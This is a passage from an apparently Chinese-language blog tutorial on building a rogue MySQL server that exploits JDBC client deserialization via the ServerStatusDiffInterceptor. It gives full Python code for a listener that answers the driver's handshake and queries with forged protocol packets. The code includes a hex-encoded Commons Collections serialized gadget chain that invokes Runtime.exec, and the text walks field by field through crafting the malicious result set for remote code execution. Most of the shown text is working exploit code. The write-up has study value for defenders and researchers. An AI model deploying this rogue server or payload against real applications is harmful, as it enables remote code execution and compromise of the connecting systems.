<h3 id="Info-Response-TABULAR-Response-OK-SELECT-session-autocommit"><a href="#Info-Response-TABULAR-Response-OK-SELECT-session-autocommit" class="headerlink" title="Info:Response TABULAR Response  OK (SELECT @@session.autocommit)"></a>Info:Response TABULAR Response  OK (SELECT @@session.autocommit)</h3><p>对于SELECT @@session.autocommit的查询结果很简单，无非就是0或者1（是或不是）,这个在filed packet和row packet可以很直观的观察出,还是直接copy mysql protocol中的内容就ok</p>
<p>继续更新代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#greeting包的伪造数据</span></span><br><span class="line">greeting_data=<span class="string">&#x27;4a0000000a382e302e313200170000000a170d656e32064600ffffc00200ffc31500000000000000000000605a28686d63690805351259006d7973716c5f6e61746976655f70617373776f726400&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Response Ok包的伪造数据</span></span><br><span class="line">response_ok_data=<span class="string">&#x27;0700000200000002000000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload_content</span>():</span><br><span class="line">    payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;向目标JDBC发送数据 : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">except</span> ConnectionResetError:</span><br><span class="line">        <span class="keyword">raise</span> ConnectionResetError(<span class="string">&quot;\n通信结束\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"><span class="comment">#程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#设置端口</span></span><br><span class="line">    host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    port=<span class="number">3309</span></span><br><span class="line">    <span class="comment">#开启一个socket接受JDBC的连接</span></span><br><span class="line">    sql_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#一旦断开连接就立马重置端口，这样不用每次等待一段时间才能重新使用该端口</span></span><br><span class="line">    sql_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    <span class="comment">#绑定ip</span></span><br><span class="line">    sql_server.bind((host, port))</span><br><span class="line">    <span class="comment">#将socket设置为被动监听模式，并且一次只能接受一个连接</span></span><br><span class="line">    sql_server.listen(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;恶意mysql已在<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>开启&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment">#conn为连接句柄,addr为接受请求的源地址</span></span><br><span class="line">        conn, addr = sql_server.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;接受到来自&#123;&#125;:&#123;&#125;的连接请求&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line">        <span class="comment">#发送greeting包</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">except</span> ConnectionResetError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;over&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;接受到的data:&quot;</span>,data)</span><br><span class="line">            <span class="comment">#收到Login包</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;password&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn,response_ok_data)</span><br><span class="line">            <span class="comment">#收到Request Query包，其中包含session.auto_increment_increment</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                reply_data=<span class="string">&quot;01000001122e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c21000c000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c21002d000000fd00001f00002a0000080364656600000014636f6c6c6174696f6e5f636f6e6e656374696f6e000c21002d000000fd00001f000022000009036465660000000c696e69745f636f6e6e656374000c21002a000000fd00001f00002900000a0364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000b03646566000000076c6963656e7365000c210009000000fd00001f00002c00000c03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000d03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000e03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000001e00000f036465660000000873716c5f6d6f6465000c21005f010000fd00001f000026000010036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000011036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001203646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000013036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f9000014013104757466380475746638047574663804757466380f757466385f756e69636f64655f63690f757466385f67656e6572616c5f63690e534554204e414d45532075746638033132300347504c0131083136373737323136023630754f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce40653595354454d0f52455045415441424c452d524541440331323007000015fe000002000000&quot;</span></span><br><span class="line">                send_data(conn,reply_data)</span><br><span class="line">            <span class="comment">#收到Request Query包，其中包含SET</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;set&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn,response_ok_data)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">r&quot;select @@session.autocommit&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                  	reply_data=<span class="string">&quot;01000001012a0000020364656600000014404073657373696f6e2e6175746f636f6d6d6974000c3f000100000008800000000002000003013107000004fe000002000000&quot;</span></span><br><span class="line">                send_data(conn,reply_data)</span><br><span class="line">                .......</span><br></pre></td></tr></table></figure>

<h3 id="Info-Request-Query-SHOW-SESSION-STATUS"><a href="#Info-Request-Query-SHOW-SESSION-STATUS" class="headerlink" title="Info: Request Query(SHOW SESSION STATUS)"></a>Info: Request Query(SHOW SESSION STATUS)</h3><p>终于到了我们最重要的地方了，因为这个查询是由com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor拦截器发送的,而这个结果集中的每一行的<strong>第一列和第二列</strong>的内容会被反序列化，我们作为恶意mysql当然可以随意伪造返回的结果集内容</p>
<p><img src="https://lanb0-1305167197.cos.ap-nanjing.myqcloud.com/20230422_3.png"></p>
<p>因此，我们需要手动构造下一个代表结果集的数据包:<strong>Response TABULAR Response  OK</strong> <strong>(SHOW SESSION STATUS)</strong></p>
<h3 id="Info-Response-TABULAR-Response-OK-SHOW-SESSION-STATUS"><a href="#Info-Response-TABULAR-Response-OK-SHOW-SESSION-STATUS" class="headerlink" title="Info:Response TABULAR Response  OK (SHOW SESSION STATUS)"></a>Info:Response TABULAR Response  OK (SHOW SESSION STATUS)</h3><p>对于TABULAR的结构,必须有四个部分,<strong>column count ,field packet,row packet,Response OK</strong></p>
<p>因为取的就是第一列和第二列的内容，所以我们先构造Number of fields为2的column count部分</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reply_data=<span class="string">&#x27;0100000102&#x27;</span>//这个部分可以直接copy正常流量的字节内容</span><br></pre></td></tr></table></figure>

<p>然后构造field packet:</p>
<ol>
<li><strong>Packet Length(3个字节)</strong>:表示该packet的长度,计算公式为:<br>$$<br>整个field packet的字节数 -开头表示Length和Number的4个字节<br>$$</li>
</ol>
<p>我们这里因为还没有构造出完整的packet，所以这里先用x占位表示</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reply_data+=<span class="string">&#x27;xxxxxx&#x27;</span></span><br></pre></td></tr></table></figure>

<p>   2.<strong>Packet Number(1个字节)</strong>:表示该packet在整个Mysql protocol中的序号,前面已经有了第一个包(column count),所以我们接着写2</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reply_data+=<span class="string">&#x27;02&#x27;</span></span><br></pre></td></tr></table></figure>

<p>   3.<strong>Catalog(4个字节)</strong>:Catalog 在 MySQL 中表示数据库，它在 MySQL 协议的 Field Packet 中提供了关于结果集所属的数据库的信息,这里设置为def,也就是默认值即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reply_data+=<span class="string">&#x27;03646566&#x27;</span></span><br></pre></td></tr></table></figure>

<p>   4.<strong>Database(1个字节)</strong>:默认为空值,但是表示长度的Length要占一个字节</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reply_data+=<span class="string">&#x27;00&#x27;</span></span><br></pre></td></tr></table></figure>

<p>  5.<strong>Table(1+n个字节)</strong>:表示从哪张表查询的结果,1是Length占一个字节,后面的n代表表名的长度,这里为了简化就把表名设为一个字节的字母’b’</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reply_data+=<span class="string">&#x27;0162&#x27;</span></span><br></pre></td></tr></table></figure>

<p>6.<strong>Original table(与⑤相同)</strong>:如果查询的表起了别名，那么这个字段代码表原本的名,正常情况下与⑤相同</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reply_data+=<span class="string">&#x27;0162&#x27;</span></span><br></pre></td></tr></table></figure>

<p>7.<strong>Name(1+n个字节)</strong>:表示从表中的哪一列查询的结果,1是Length占一个字节,后面的n代表表名的长度,这里为了简化就把表名设为一个字节的字母’B’</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reply_data+=<span class="string">&#x27;0142&#x27;</span></span><br></pre></td></tr></table></figure>

<p>6.<strong>Original name(与⑦相同)</strong>:一样的道理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reply_data+=<span class="string">&#x27;0142&#x27;</span></span><br></pre></td></tr></table></figure>

<p>下一个0c目前暂不清楚有什么作用，wireshark也未标明,就当做一个连接符或者占位符吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reply_data+=<span class="string">&#x27;0c&#x27;</span></span><br></pre></td></tr></table></figure>

<p>7.<strong>Charset Number(2个字节)</strong>:规定mysql使用的字符集,这里设置为<strong>utf-8</strong>,十六进制为<strong>3f</strong>,默认使用的ff(原始二进制字符集)无法有效识别反序列化payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reply_data+=<span class="string">&#x27;3f00&#x27;</span></span><br></pre></td></tr></table></figure>

<p>8.<strong>Length(4个字节)</strong>:表明字段的最大长度(如果实际字段的值超过了这个数字，mysql依然可以正常执行，只是会耗费更多的时间去计算实际数据长度),我们这里直接设成最大的值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reply_data+=<span class="string">&#x27;ffff0000&#x27;</span></span><br></pre></td></tr></table></figure>



<p>9.<strong>Type(1个字节)</strong>:表明字段类型,要成功反序列化需要将类型改为Blob,十六进制为**’fc’**</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reply_data+=<span class="string">&#x27;fc&#x27;</span></span><br></pre></td></tr></table></figure>

<p>10.<strong>Flags(2个字节)</strong>:一些描述字段特征的标志位,比如是否为not null,主键之类的,</p>
<p>看别的师傅的文章，这里设置的是9000,虽然可以跑，但是不理解</p>
<p>计算方式为:将十六进制”9000”转换为<strong>十六位</strong>二进制(注意手动填充补0)</p>
<blockquote>
<p>0x9000&lt;&#x3D;&gt;0001 0000 0000 0001</p>
</blockquote>
<p><img src="https://lanb0-1305167197.cos.ap-nanjing.myqcloud.com/20230423_1.png" alt="(0x1001是我捕捉的正常mysql流量与此无关)"></p>
<p>可以看出Blob位在从右往左第5位，而9000转换为二进制后第5位依然是0，但实际上可以成功RCE，并且我试了0090,0010这种二进制的第5位均为1的flags却都不能成功RCE，所以目前不太清楚到底是如何计算的,但我们可以将其全部设置为1(暴力)，或者用别的文章里的9000</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reply_data+=<span class="string">&#x27;ffff&#x27;</span><span class="comment"># or reply_data+=&#x27;9000&#x27;</span></span><br></pre></td></tr></table></figure>

<p>11.<strong>Decimals(1个字节)</strong>:规定小数的位数,我们这里字段不是浮点数,直接默认值00</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reply_data+=<span class="string">&#x27;00&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>最后结尾填充2个字节的’00’</strong></p>
<p>一个完整的field packet到此就构建完成了，第二个field packet只需要把包序列号加1就行，其他原封不动</p>
<p>更新代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#greeting包的伪造数据</span></span><br><span class="line">greeting_data=<span class="string">&#x27;4a0000000a382e302e313200170000000a170d656e32064600ffffc00200ffc31500000000000000000000605a28686d63690805351259006d7973716c5f6e61746976655f70617373776f726400&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Response Ok包的伪造数据</span></span><br><span class="line">response_ok_data=<span class="string">&#x27;0700000200000002000000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload_content</span>():</span><br><span class="line">    payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;向目标JDBC发送数据 : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">except</span> ConnectionResetError:</span><br><span class="line">        <span class="keyword">raise</span> ConnectionResetError(<span class="string">&quot;\n通信结束\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"><span class="comment">#程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#设置端口</span></span><br><span class="line">    host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    port=<span class="number">3309</span></span><br><span class="line">    <span class="comment">#开启一个socket接受JDBC的连接</span></span><br><span class="line">    sql_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#一旦断开连接就立马重置端口，这样不用每次等待一段时间才能重新使用该端口</span></span><br><span class="line">    sql_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    <span class="comment">#绑定ip</span></span><br><span class="line">    sql_server.bind((host, port))</span><br><span class="line">    <span class="comment">#将socket设置为被动监听模式，并且一次只能接受一个连接</span></span><br><span class="line">    sql_server.listen(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;恶意mysql已在<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>开启&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment">#conn为连接句柄,addr为接受请求的源地址</span></span><br><span class="line">        conn, addr = sql_server.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;接受到来自&#123;&#125;:&#123;&#125;的连接请求&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line">        <span class="comment">#发送greeting包</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">except</span> ConnectionResetError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;over&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;接受到的data:&quot;</span>,data)</span><br><span class="line">            <span class="comment">#收到Login包</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;password&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn,response_ok_data)</span><br><span class="line">            <span class="comment">#收到Request Query包，其中包含session.auto_increment_increment</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                reply_data=<span class="string">&quot;01000001122e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c21000c000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c21002d000000fd00001f00002a0000080364656600000014636f6c6c6174696f6e5f636f6e6e656374696f6e000c21002d000000fd00001f000022000009036465660000000c696e69745f636f6e6e656374000c21002a000000fd00001f00002900000a0364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000b03646566000000076c6963656e7365000c210009000000fd00001f00002c00000c03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000d03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000e03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000001e00000f036465660000000873716c5f6d6f6465000c21005f010000fd00001f000026000010036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000011036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001203646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000013036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f9000014013104757466380475746638047574663804757466380f757466385f756e69636f64655f63690f757466385f67656e6572616c5f63690e534554204e414d45532075746638033132300347504c0131083136373737323136023630754f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce40653595354454d0f52455045415441424c452d524541440331323007000015fe000002000000&quot;</span></span><br><span class="line">                send_data(conn,reply_data)</span><br><span class="line">            <span class="comment">#收到Request Query包，其中包含SET</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;set&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn,response_ok_data)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">r&quot;select @@session.autocommit&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                  	reply_data=<span class="string">&quot;01000001012a0000020364656600000014404073657373696f6e2e6175746f636f6d6d6974000c3f000100000008800000000002000003013107000004fe000002000000&quot;</span></span><br><span class="line">                send_data(conn,reply_data)</span><br><span 